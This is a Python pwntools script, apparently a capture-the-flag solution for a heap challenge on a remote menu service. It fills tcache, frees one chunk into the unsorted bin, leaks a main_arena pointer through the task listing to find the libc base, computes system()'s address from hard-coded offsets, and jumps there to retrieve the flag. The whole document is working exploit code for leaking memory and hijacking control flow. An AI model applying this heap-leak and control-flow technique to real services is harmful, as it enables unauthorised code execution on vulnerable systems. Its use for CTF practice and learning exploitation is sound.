from pwn import *


OFFSET_LIBC_MAIN_ARENA = 0x219CE0
OFFSET_LIBC_SYSTEM_FUNC = 0x50D60


def execute(p, address: int):
    p.sendline(b'4')
    print(p.recvn(len("address? ")))
    p.sendline(f'{address}'.encode('ascii'))

def process_menu(p):
    for _ in range(6):
        print(p.recvline())
    print(p.recvn(8))  # fetch "choice? "


def create_task(p):
    p.sendline(b'1')
    print(p.recvn(6))  # fetch "name? "
    p.sendline(b'a')


def delete_task(p, i):
    p.sendline(b'2')
    print(p.recvn(4))  # fetch "id? "
    p.sendline(f'{i}'.encode('ascii'))


def main():
    # p = process(['./main'])
    p = remote('<host>', 31337, ssl=True)

    tasks_num = 8

    for _ in range(tasks_num):
        process_menu(p)
        create_task(p)

    # free last 7 tasks on heap, so they end up in tcache
    for i in range(1, tasks_num):
        process_menu(p)
        delete_task(p, i)

    # free first task, which will end up in unsortedbin
    process_menu(p)
    delete_task(p, 0)

    # list tasks to get all tasks
    process_menu(p)
    p.sendline(b'3')  # list tasks
    first_task_content = p.recvline()

    fd_pointer_address = first_task_content[5:-1].hex()
    libc_address = int.from_bytes(bytes.fromhex(fd_pointer_address), 'little')
    libc_address -= OFFSET_LIBC_MAIN_ARENA

    system_func_address = libc_address + OFFSET_LIBC_SYSTEM_FUNC
    # print(system_func_address.to_bytes(8, 'big').hex())

    # gdb.attach(p)

    # throw away remaining tasks
    for _ in range(tasks_num - 1):
        p.recvline()

    # execute
    process_menu(p)
    execute(p, system_func_address)
    p.recvline()  # Jumping to blabla
    flag = p.recvline()
    print(flag)


if __name__ == "__main__":
    main()
